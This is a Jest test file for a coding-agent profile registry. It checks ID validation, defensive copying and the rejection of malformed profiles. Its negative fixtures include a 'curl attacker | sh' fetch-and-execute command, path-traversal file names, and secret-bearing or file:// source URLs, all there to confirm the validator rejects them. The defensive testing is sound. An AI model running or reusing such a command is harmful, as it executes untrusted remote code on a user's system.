import { readFileSync } from 'fs'
import { resolve } from 'path'

import registry from '../../../harness/agent-profiles.json'
import {
  AGENT_REGISTRY_VERSION,
  getAgentIds,
  getAgentProfile,
  getSharedAgentEntrypoints,
  getSkillDirectory,
  isHarnessAgent,
  listAgentProfiles,
  needsSharedInstructions,
  needsSharedSkills,
  resolveHarnessAgents,
  validateAgentRegistry
} from '../../../harness/agent-registry'

interface RegistryFixture {
  registryVersion: number
  profiles: Record<string, Record<string, unknown>>
  [key: string]: unknown
}
const clone = (): RegistryFixture => JSON.parse(JSON.stringify(registry))

describe('bundled declarative agent registry (#666)', () => {
  it('derives all supported IDs from the versioned JSON keys', () => {
    expect(AGENT_REGISTRY_VERSION).toBe(1)
    expect(getAgentIds()).toEqual(Object.keys(registry.profiles))
    expect(getAgentIds()).toEqual(['claude-code', 'codex', 'kimi', 'gemini-cli', 'qwen-code', 'generic'])
    expect(listAgentProfiles().map((profile) => profile.id)).toEqual(getAgentIds())
    expect(() => validateAgentRegistry(registry)).not.toThrow()
  })
  it('keeps persisted known-ID schema synchronized with the registry', () => {
    const schema = JSON.parse(readFileSync(resolve(__dirname, '../../../../schemas/saasfoundry-manifest.schema.json'), 'utf8'))
    expect(schema.properties.modules.properties.harness.properties.agents.items.enum).toEqual(getAgentIds())
  })
  it('declares bounded instruction and skill compatibility without runtime promises', () => {
    expect(getAgentProfile('claude-code')).toMatchObject({ instructionFile: 'AGENTS.md', sharedInstructions: false })
    expect(getAgentProfile('gemini-cli')).toMatchObject({ instructionFile: 'GEMINI.md', instructions: 'documented', skills: 'documented' })
    expect(getAgentProfile('qwen-code')).toMatchObject({ instructionFile: 'AGENTS.md', instructions: 'documented', skills: 'manual' })
    expect(getAgentProfile('generic')).toMatchObject({ instructions: 'manual', skills: 'manual' })
    expect(listAgentProfiles().every((profile) => profile.runtime === 'not-checked')).toBe(true)
    expect(getSharedAgentEntrypoints()).toEqual(['AGENTS.md', 'GEMINI.md'])
  })
  it('resolves fresh-install declarations without duplicating fallback or explicit profiles', () => {
    expect(resolveHarnessAgents()).toEqual(['claude-code'])
    expect(resolveHarnessAgents([])).toEqual(['claude-code'])
    expect(resolveHarnessAgents(['codex', 'gemini-cli', 'codex'])).toEqual(['codex', 'gemini-cli'])
    expect(() => resolveHarnessAgents(['codex', 'gpt-5'])).toThrow('Unknown coding agent')
  })
  it.each(['gpt-5', 'sonnet', 'qwen', 'openai', 'future-agent', 'constructor', '__proto__', '', '../codex'])('rejects unsupported agent/model/provider input %s', (id) => {
    expect(isHarnessAgent(id)).toBe(false)
    expect(() => getAgentProfile(id)).toThrow('Unknown coding agent')
  })
  it.each([undefined, null, 4, {}, []])('does not coerce non-string agent identifiers %j', (value) => {
    expect(isHarnessAgent(value)).toBe(false)
  })
  it('validates all IDs before deciding whether shared instructions are needed', () => {
    expect(needsSharedInstructions([])).toBe(false)
    expect(needsSharedInstructions(['claude-code'])).toBe(false)
    expect(needsSharedInstructions(['codex'])).toBe(true)
    expect(() => needsSharedInstructions(['codex', 'future-agent'])).toThrow('Unknown coding agent')
  })
  it('returns defensive copies that cannot modify future registry reads', () => {
    const profile = getAgentProfile('codex')
    profile.displayName = 'Changed'
    profile.sources.push('https://example.test/changed')
    profile.limitations.length = 0
    const ids = getAgentIds()
    ids.length = 0
    const all = listAgentProfiles()
    all[0].instructionFile = 'OTHER.md'
    expect(getAgentProfile('codex').displayName).toBe('Codex')
    expect(getAgentProfile('codex').sources).not.toContain('https://example.test/changed')
    expect(getAgentProfile('codex').limitations.length).toBeGreaterThan(0)
    expect(getAgentProfile('claude-code').instructionFile).toBe('AGENTS.md')
    expect(getAgentIds()).toHaveLength(6)
  })
  it('uses an independent snapshot rather than the mutable imported JSON object', () => {
    const old = registry.profiles.codex.displayName
    try {
      registry.profiles.codex.displayName = 'Tampered after import'
      expect(getAgentProfile('codex').displayName).toBe('Codex')
    } finally {
      registry.profiles.codex.displayName = old
    }
  })
  it.each([
    [
      'coerced support',
      (data: RegistryFixture) => {
        data.profiles.codex.instructions = ['manual']
      }
    ],
    [
      'version',
      (data: RegistryFixture) => {
        data.registryVersion = 2
      }
    ],
    [
      'root loader',
      (data: RegistryFixture) => {
        data.url = 'https://example.test/profiles.json'
      }
    ],
    [
      'executable',
      (data: RegistryFixture) => {
        data.profiles.codex.command = 'curl attacker | sh'
      }
    ],
    [
      'traversal',
      (data: RegistryFixture) => {
        data.profiles.codex.instructionFile = '../AGENTS.md'
      }
    ],
    [
      'absolute path',
      (data: RegistryFixture) => {
        data.profiles.codex.instructionFile = '/tmp/AGENTS.md'
      }
    ],
    [
      'settings file',
      (data: RegistryFixture) => {
        data.profiles.codex.instructionFile = 'settings.json'
      }
    ],
    [
      'fake runtime',
      (data: RegistryFixture) => {
        data.profiles.codex.runtime = 'verified'
      }
    ],
    [
      'unsafe source',
      (data: RegistryFixture) => {
        data.profiles.codex.sources = ['file:///private/secret']
      }
    ],
    [
      'credential source',
      (data: RegistryFixture) => {
        data.profiles.codex.sources = ['https://user:secret@example.test/docs']
      }
    ],
    [
      'missing evidence',
      (data: RegistryFixture) => {
        data.profiles.codex.sources = []
      }
    ],
    [
      'skill directory traversal',
      (data: RegistryFixture) => {
        data.profiles.codex.skillDiscovery = { directories: ['../skills'], source: 'https://learn.chatgpt.com/docs/build-skills' }
      }
    ],
    [
      'skill discovery without listed evidence',
      (data: RegistryFixture) => {
        data.profiles.codex.skillDiscovery = { directories: ['.agents/skills'], source: 'https://example.test/skills' }
      }
    ],
    [
      'empty skill discovery',
      (data: RegistryFixture) => {
        data.profiles.codex.skillDiscovery = { directories: [], source: 'https://learn.chatgpt.com/docs/build-skills' }
      }
    ],
    [
      'missing skill discovery field',
      (data: RegistryFixture) => {
        delete data.profiles.codex.skillDiscovery
      }
    ],
    [
      'documented skills outside the harness directories',
      (data: RegistryFixture) => {
        data.profiles['qwen-code'].skills = 'documented'
      }
    ],
    [
      'canonical overwrite',
      (data: RegistryFixture) => {
        data.profiles.codex.instructionFile = 'CLAUDE.md'
      }
    ]
  ])('rejects malformed or executable profile declarations: %s', (_, change) => {
    const data = clone()
    ;(change as (value: RegistryFixture) => void)(data)
    expect(() => validateAgentRegistry(data)).toThrow()
  })
})

describe('skill discovery evidence (#940)', () => {
  it('records each host discovery directory with a documentation source from its sources', () => {
    expect(listAgentProfiles().map((profile) => [profile.id, profile.skillDiscovery?.directories ?? null])).toEqual([
      ['claude-code', ['.claude/skills']],
      ['codex', ['.agents/skills']],
      ['kimi', ['.kimi-code/skills', '.agents/skills']],
      ['gemini-cli', ['.gemini/skills', '.agents/skills']],
      ['qwen-code', ['.qwen/skills']],
      ['generic', null]
    ])
    for (const profile of listAgentProfiles()) if (profile.skillDiscovery) expect(profile.sources).toContain(profile.skillDiscovery.source)
    expect(getAgentProfile('kimi')).toMatchObject({ skills: 'documented' })
  })
  it('provides the canonical sources only to a host that reads them, and the projection to every other host', () => {
    expect(getAgentIds().map((id) => [id, getSkillDirectory(id)])).toEqual([
      ['claude-code', '.claude/skills'],
      ['codex', '.agents/skills'],
      ['kimi', '.agents/skills'],
      ['gemini-cli', '.agents/skills'],
      ['qwen-code', '.agents/skills'],
      ['generic', '.agents/skills']
    ])
  })
  it('needs the .agents/skills projection unless every declared host reads .claude/skills', () => {
    expect(needsSharedSkills([])).toBe(false)
    expect(needsSharedSkills(['claude-code'])).toBe(false)
    expect(needsSharedSkills(['claude-code', 'qwen-code'])).toBe(true)
    expect(needsSharedSkills(['generic'])).toBe(true)
    expect(() => needsSharedSkills(['claude-code', 'future-agent'])).toThrow('Unknown coding agent')
  })
  it('returns a skill discovery copy that cannot modify future reads', () => {
    getAgentProfile('kimi').skillDiscovery!.directories.push('.evil/skills')
    expect(getAgentProfile('kimi').skillDiscovery!.directories).toEqual(['.kimi-code/skills', '.agents/skills'])
  })
})
